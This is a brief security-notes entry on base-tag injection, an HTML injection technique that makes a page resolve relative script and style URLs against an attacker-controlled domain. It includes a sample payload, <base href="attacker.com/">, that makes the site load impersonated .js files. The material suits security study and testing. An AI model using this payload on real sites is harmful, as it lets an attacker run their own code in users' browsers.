#base-tag-injection #html-injection
The `<base>` HTML tag tells the browser **where to resolve all relative URLS** in the page. 
E.g, `<base href="my-site.com/">` will result in calls to `/uploads/cat.jpg` resolving to --> `https://my-site.com/uploads/cat.jpg`.

If you can inject `HTML`, can potentially **redirect all `<base>` URL calls to an attacker-controlled domain**, and coerce the app into **loading identically-named, arbitrary files** from your server.

E.g. if you can inject `<base href="attacker.com/">` onto the page, and then **host identical `.js`, `.css` or `html` files** corresponding to files the **app loads externally** (in a **relative way**, i.e. not a FQDN), can potentially inject your own files/code.

**[EXAMPLE](https://www.youtube.com/watch?v=x9Z2Fcm_L0A):**
By changing the `<base>`...
![](attachments/96657.png)
`.js` files from the attacker's server impersonating legitimate files required by the site, are loaded.
![](attachments/33898.jpeg)